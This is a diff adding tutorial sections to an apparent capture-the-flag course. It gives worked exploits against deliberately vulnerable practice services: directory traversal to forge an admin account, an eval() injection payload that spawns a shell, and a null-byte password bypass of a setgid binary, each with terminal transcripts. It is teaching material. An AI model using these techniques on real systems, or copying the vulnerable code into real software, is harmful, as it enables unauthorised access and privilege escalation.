@@ -1701,14 +1701,361 @@ if __name__ == "__main__":
     main()
 ```
 
-<TODO>
+Let's go through a legitimate run to get a feel of what is going on.
+
+```bash
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1340
+Secret Storage 1.0
+You are not logged in. Please choose one option:
+1. Log in
+2. Create Account
+2
+Please enter your name: elliot
+Please enter your password: alderson
+Account created. Please log in.
+You are not logged in. Please choose one option:
+1. Log in
+2. Create Account
+1
+Please enter your name: elliot
+Please enter your password: alderson
+Success!
+Welcome elliot!
+1. Retrieve secret
+2. Store secret
+3. Read admin secret
+2
+What is the name of the secret you want to store: mrrobot
+What secret would you like to store: CONTROL
+Secret written!
+Welcome elliot!
+1. Retrieve secret
+2. Store secret
+3. Read admin secret
+1
+Which secret would you like to retrieve: mrrobot
+Here's your secret: CONTROL
+Welcome elliot!
+1. Retrieve secret
+2. Store secret
+3. Read admin secret
+3
+You are not admin.
+Welcome elliot!
+1. Retrieve secret
+2. Store secret
+3. Read admin secret
+^C
+elliot@ctf101-shell:~/ctf101$
+```
+
+Looks like we can create accounts, store secrets, and retrieve them. However, we
+are not allowed to read the admin secret. We have to have admin privileges for
+that. Let's go back to the source code and see how they determine that. There is
+a `validate` function that checks if the username and password is correct:
+
+```python
+# Validate the username and password
+def validate(name, password):
+    try:
+        with open("/home/arbitrarywrite/accounts/" + name) as accountfile:
+            adminflag, filepassword = accountfile.read().split(":")
+            if password == filepassword:
+                global logged_in
+                logged_in = name
+                if adminflag == "1":
+                    global admin
+                    admin = True
+                return True
+    except:
+        write("No such account.\n")
+    return False
+```
+
+The `admin` variable is set if the `adminflag` is 1. It also looks as if all of
+the account information is located in a directory called `accounts`. We can look
+at the registration function `create_user` to figure out the format the user
+accounts are stored in:
+
+```python
+# Create users by writing them to file
+def create_user(name, password):
+    with open("/home/arbitrarywrite/accounts/" + name, "w") as accountfile:
+        accountfile.write("0:" + password)
+    write("Account created. Please log in.\n")
+```
+
+Looks like new accounts are created with the username as the filename and
+contains a string in the format of `0:<password>` with the 0 denoting non-admin.
+If we can create our own account file with a 1 in place of that 0, we can obtain
+admin rights. If we look at how secrets are stored, we can see that there is an
+arbitrary write vulnerability in the `store_secret` function:
+
+```python
+# Write secrets to file
+def store_secret(secretname, secret):
+    try:
+        with open("/home/arbitrarywrite/secrets/%s" % (secretname), "w") \
+            as secretfile:
+            secretfile.write(secret)
+            write("Secret written!\n")
+    except:
+        write("Error in writing secret.\n")
+```
+
+Since we can reuse that directory traversal trick, we can go up one directory,
+down the accounts directory and create a file of our choosing. We can leverage
+this to store a secret with the contents `1:password` and a controlled filename
+to create our admin user. The attack looks like this:
+
+```bash
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1340
+Secret Storage 1.0
+You are not logged in. Please choose one option:
+1. Log in
+2. Create Account
+1
+Please enter your name: elliot
+Please enter your password: alderson
+Success!
+Welcome elliot!
+1. Retrieve secret
+2. Store secret
+3. Read admin secret
+2
+What is the name of the secret you want to store: ../accounts/mrrobot
+What secret would you like to store: 1:mrrobot
+Secret written!
+Welcome elliot!
+1. Retrieve secret
+2. Store secret
+3. Read admin secret
+^C
+elliot@ctf101-shell:~/ctf101$
+```
+
+Now, we can log in with our new admin account and read the admin secret:
+
+```bash
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1340
+Secret Storage 1.0
+You are not logged in. Please choose one option:
+1. Log in
+2. Create Account
+1
+Please enter your name: mrrobot
+Please enter your password: mrrobot
+Success!
+Welcome mrrobot!
+1. Retrieve secret
+2. Store secret
+3. Read admin secret
+3
+Here is the admin's secret: ctf101{1ts_3am_1_w4nt_m4cd0nalds}
+
+Welcome mrrobot!
+1. Retrieve secret
+2. Store secret
+3. Read admin secret
+```
 
 ### Remote Code Execution
 
+Itching to pop a shell yet? In this practical example, you'll finally get to.
+Take a look at the following code:
+
+```python
+#! /usr/bin/python
+
+import sys
+
+def write(data):
+    sys.stdout.write(data)
+    sys.stdout.flush()
+
+def main():
+    write("SuperCalculator (e.g. 2+2): ")
+    eqn = sys.stdin.readline().strip()
+    answer = eval(eqn)
+    write("%s = %s\n" % (eqn, answer))
+
+if __name__ == "__main__":
+    main()
+```
+
+Let's see what it does when you interact with it legitimately.
+
+```
+elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1341
+SuperCalculator (e.g. 2+2): 4+4
+4+4 = 8
+elliot@ctf101-shell:~/ctf101$
+```
+
+Seems like it is a simple calculator. But let's take a look at a particularly
+suspicious line:
+
+```python
+    answer = eval(eqn)
+```
+
+Now, whenever a script uses an evaluate statement over user supplied input an
+exploitable bug is bound to be discovered within. In this case, arbitrary python
+code can be written as payload to spawn a remote shell. However, we have to be
+very careful to write it as one line due to the nature of the code. Try to get a
+usable shell!
+
+There are multiple solutions, but here is one:
+
+```bash
+$ python codeexec.py
+SuperCalculator (e.g. 2+2): __import__("os").system("bash")
+$
+```
 
 ### Privilege Escalation
 
 
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int check(char *user_pass, char *pass) {
+    int index = 0;
+    while (user_pass[index] != 0) {
+        if (user_pass[index] != pass[index]) {
+            return 0;
+        }
+        index++;
+    }
+    return 1;
+}
+
+int main(int argc, char *argv[]) {
+    char user_pass[256];
+    printf("Password: ");
+    scanf("%255s", user_pass);
+    if (check(user_pass, "XXXXXXXXXXXXXXXXXXXXXXXX")) {
+        printf("Win!\n");
+        execl("/bin/sh", "/bin/sh", "-p", NULL);
+    }
+    else {
+        printf("Fail!\n");
+    }
+}
+```
+
+The password in the source code is redacted, of course. You don't need it to log
+in when there's a vulnerability in the code.
+
+The service is running at `ssh -p 1342 escalate@pwn.spro.ink`. Login with the
+password `escalate`. Here's a sample run:
+
+```bash
+elliot@ctf101-shell:~/ctf101$ ssh -p 1342 escalate@pwn.spro.ink
+The authenticity of host '[pwn.spro.ink]:1342 ([188.166.246.7]:1342)' can't be
+established.
+ECDSA key fingerprint is SHA256:SJgGuvu30lYSzLjwdwsqsxpmkIZiw8y49e/iN5MMHug.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[pwn.spro.ink]:1342,[188.166.246.7]:1342' (ECDSA) to
+the list of known hosts.
+escalate@pwn.spro.ink's password:
+Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-34-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+$ ls -la
+total 36
+drwxr-xr-x  2 root privesca 4096 Aug 19 22:08 .
+drwxr-xr-x 11 root root     4096 Aug 19 22:08 ..
+-rwxr-x---  1 root privesca  220 Aug 31  2015 .bash_logout
+-rwxr-x---  1 root privesca 3771 Aug 31  2015 .bashrc
+-rwxr-x---  1 root privesca  655 Jun 24 15:44 .profile
+-rwxr-sr-x  1 root privesca 8776 Aug 19 22:03 escalate
+-r--r-----  1 root privesca   30 Aug 19 22:04 flag
+$ ./escalate
+Password: idk
+Fail!
+$
+```
+
+If you look closely, the escalate binary is a setgid binary. This means that
+when run, the process adopts the privileges of the group that owns it. If we
+somehow managed to take control of the process, we would effectively be able to
+act with the privileges of that group. Which is incidentally what we need to
+read that flag file.
+
+The idea is to leverage a vulnerability in the way the program validates the
+password. Look at these lines of code:
+
+```c
+    while (user_pass[index] != 0) {
+        if (user_pass[index] != pass[index]) {
+            return 0;
+        }
+```
+
+Notice that the loop runs for as long as it receives no null bytes. If the
+function returns zero, it means that the password was invalid. Otherwise, the
+password is valid. This means that if we can avoid the entire loop altogether,
+we can bypass the authentication completely. To do this, we simply provide a
+string starting with a null byte to immediately halt the loop. We shall use some
+python for this.
+
+```bash
+$ python -c 'print "\x00"' | ./escalate
+Password: Win!
+$ id
+uid=1001(escalate) gid=1001(escalate) groups=1001(escalate)
+$
+```
+
+Notice that it says we have successfully authenticated which should have given
+us a real nice elevated shell. However, notice that no extra privileges are
+conferred yet. This is because the streams are closed. To get around this, we
+use `cat` on `stdin` as our 'bridge'.
+
+```bash
+$ (python -c 'print "\x00"'; cat -) | ./escalate
+Password: Win!
+id
+uid=1001(escalate) gid=1001(escalate) egid=1000(privesca)
+groups=1000(privesca),1001(escalate)
+ls -la
+total 36
+drwxr-xr-x  2 root privesca 4096 Aug 19 22:08 .
+drwxr-xr-x 11 root root     4096 Aug 19 22:08 ..
+-rwxr-x---  1 root privesca  220 Aug 31  2015 .bash_logout
+-rwxr-x---  1 root privesca 3771 Aug 31  2015 .bashrc
+-rwxr-x---  1 root privesca  655 Jun 24 15:44 .profile
+-rwxr-sr-x  1 root privesca 8776 Aug 19 22:03 escalate
+-r--r-----  1 root privesca   30 Aug 19 22:04 flag
+cat flag
+ctf101{s0m3th1ng_4b0ut_kr34y}
+^C
+$
+```
+
+Notice now that we have the `privesca` group privilege and are now able to read
+the flag.
 
 ## 6. Data Representation and Endianness
 
